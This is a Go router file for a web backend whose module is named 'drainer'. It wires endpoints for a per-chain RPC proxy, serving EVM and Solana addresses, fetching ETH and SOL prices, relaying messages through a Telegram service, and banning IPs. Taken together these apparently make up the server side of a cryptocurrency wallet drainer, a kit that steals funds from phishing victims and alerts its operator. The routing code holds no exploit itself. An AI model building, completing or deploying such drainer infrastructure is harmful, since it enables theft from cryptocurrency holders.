package router

import (
	"github.com/gin-contrib/cors"
	"github.com/gin-gonic/gin"

	"drainer/internal/config"
	"drainer/internal/handler"
	"drainer/internal/middleware"
	"drainer/internal/service"
)

func New(cfg *config.Config, banSvc *service.BanService, tgSvc *service.TelegramService) *gin.Engine {
	if cfg.GinMode != "" {
		gin.SetMode(cfg.GinMode)
	}

	r := gin.New()
	h := handler.New(cfg, banSvc, tgSvc)

	// ── Middleware globaux ────────────────────────────────────────────────────
	r.Use(gin.Logger())
	r.Use(gin.Recovery())
	r.Use(cors.New(corsConfig(cfg)))
	r.Use(middleware.Security())
	r.Use(middleware.Ban(banSvc))

	// ── Routes publiques ──────────────────────────────────────────────────────
	api := r.Group("/api")
	{
		api.POST("/rpc/:chainId", h.RPCProxy)
		api.GET("/evm", h.GetEVMAddresses)
		api.GET("/solana", h.GetSolAddresses)
		api.GET("/chain_evm", h.GetChainEVM)
		api.GET("/chain_sol", h.GetChainSol)
		api.GET("/price_eth", h.GetEthPrice)
		api.GET("/price_sol", h.GetSolPrice)
		api.POST("/sendMessage", h.SendMessage)
		api.POST("/ban", h.BanIP)
	}

	return r
}

func corsConfig(cfg *config.Config) cors.Config {
	origins := make([]string, 0, len(cfg.AllowedOrigins))
	for _, o := range cfg.AllowedOrigins {
		if o != "" {
			origins = append(origins, o)
		}
	}

	return cors.Config{
		AllowOrigins: origins,
		AllowMethods: []string{"GET", "POST", "OPTIONS"},
		AllowHeaders: []string{"Origin", "Content-Type", "Authorization"},
	}
}
